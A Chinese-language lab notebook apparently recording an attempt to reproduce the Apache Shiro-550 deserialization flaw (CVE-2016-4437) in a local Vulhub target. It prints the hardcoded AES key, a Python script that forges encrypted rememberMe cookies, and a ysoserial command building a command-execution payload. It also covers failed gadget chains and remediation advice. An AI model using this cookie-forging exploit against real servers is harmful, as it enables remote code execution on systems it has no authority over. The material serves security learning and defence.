# CVE-2016-4437 Shiro-550 复现笔记

> 本地 Vulhub 环境 | 复现时间：2026.08.25

---

## 漏洞原理

Shiro 1.2.4 及之前版本，`rememberMe` 功能使用了一个硬编码的 AES 密钥：

```text
kPH+bIxk5D2deZiIxcaaaA==
攻击者利用该密钥构造恶意序列化对象，加密后作为 Cookie 发送。服务端解密并反序列化时触发任意代码执行。

核心问题：密钥写死 + 反序列化。

环境信息
项目	详情
攻击机	Kali Linux
靶场	Vulhub / shiro 1.2.4
靶机地址	http://192.168.1.81:8080
工具	Burp Suite、ysoserial、Python
复现过程
1. 启动靶场
bash
cd vulhub/shiro/CVE-2016-4437
docker-compose up -d
https://./screenshots/1-docker-up.png

2. 确认漏洞存在
浏览器访问靶机登录页，抓包查看响应头：

text
Set-Cookie: rememberMe=deleteMe
存在该字段说明 rememberMe 功能已启用。

https://./screenshots/3-burp-cookie.png

3. 生成恶意 Cookie
Shiro 处理 rememberMe Cookie 的流程：

序列化恶意对象

AES 加密（CBC 模式，密钥固定）

拼接 16 字节 IV（全零）

Base64 编码

加密脚本如下：

python
import base64
from Crypto.Cipher import AES

KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")

def make_shiro_cookie(data):
    iv = b'\x00' * 16
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pad_len = 16 - len(data) % 16
    data += bytes([pad_len]) * pad_len
    encrypted = cipher.encrypt(data)
    return base64.b64encode(iv + encrypted).decode()
使用 ysoserial 生成 payload：

bash
java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
执行脚本后得到 Base64 编码的 Cookie 值。

https://./screenshots/5-encrypt-result.png

4. 发送恶意请求
在 Burp 中拦截请求，将 Cookie 替换为：

text
rememberMe=<生成的Base64字符串>
发送请求。

https://./screenshots/6-burp-send.png

踩坑记录
问题现象
发送恶意 Cookie 后，服务器返回 302 重定向，并清除 rememberMe：

text
Set-Cookie: rememberMe=deleteMe
Location: /login
测试结果
Gadget 链	响应
CommonsCollections1	302
CommonsCollections2	302
CommonsBeanutils1	302
Jdk7u21	302
原因分析
目标环境缺少对应的 Commons 依赖库，反序列化时类加载失败，Shiro 捕获异常后清除 Cookie 并重定向到登录页。

这说明在实际场景中，反序列化链需要根据目标环境的依赖版本动态选择，并非所有链都通用。

修复建议
升级 Shiro 至 1.2.5 以上版本

自定义 rememberMe AES 密钥，避免使用默认值

如业务不需要，直接禁用 rememberMe 功能

总结
本次复现掌握了以下内容：

Shiro rememberMe 加密流程（AES-CBC + 硬编码密钥）

恶意 Cookie 的构造方法

不同反序列化链的适用条件与依赖差异

实际环境下的排错思路

漏洞利用不是一蹴而就的，链的选择、环境版本都是变量。

后续计划
□ 更换靶场环境继续验证 Shiro-550
□ 复现 Log4j2（CVE-2021-44228）
